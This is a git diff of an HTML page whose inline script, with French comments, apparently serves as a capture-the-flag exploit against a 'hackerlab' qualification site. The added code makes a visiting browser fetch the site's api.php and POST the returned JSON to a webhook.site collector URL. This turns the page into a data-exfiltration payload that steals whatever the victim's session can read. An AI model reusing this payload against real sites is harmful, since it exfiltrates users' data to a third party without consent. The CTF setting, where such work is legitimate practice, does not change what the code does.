@@ -2,26 +2,35 @@
 <html>
   <body>
 <script>
-      fetch('https://webhook.site/0496b1c1-9913-4b2f-a3ac-50ee0bf25492', {
+fetch('https://xnotes.qualif.hackerlab.bj/api.php')
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Erreur de requête API : ' + response.statusText);
+      }
+      return response.json(); // Assumer que l'API retourne un JSON
+    })
+    .then(data => {
+      console.log('Données reçues de l\'API :', data);
+
+      // Envoyer les données reçues au webhook
+      return fetch('https://webhook.site/0496b1c1-9913-4b2f-a3ac-50ee0bf25492', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
-        }
-      })
+        },
+        body: JSON.stringify(data) // Convertir les données en chaîne JSON
+      });
+    })
     .then(response => {
-      // Vérifiez si la requête a réussi
       if (!response.ok) {
-        throw new Error('Erreur de requête : ' + response.statusText);
+        throw new Error('Erreur lors de l\'envoi au webhook : ' + response.statusText);
       }
-      // Retournez la réponse sous forme de texte
       return response.text();
     })
-    .then(data => {
-      // Traitez la réponse de la requête ici
-      console.log('Réponse :', data);
+    .then(responseText => {
+      console.log('Réponse du webhook :', responseText);
     })
     .catch(error => {
-      // Gérez les erreurs de la requête ici
       console.error('Erreur :', error);
     });
     </script>
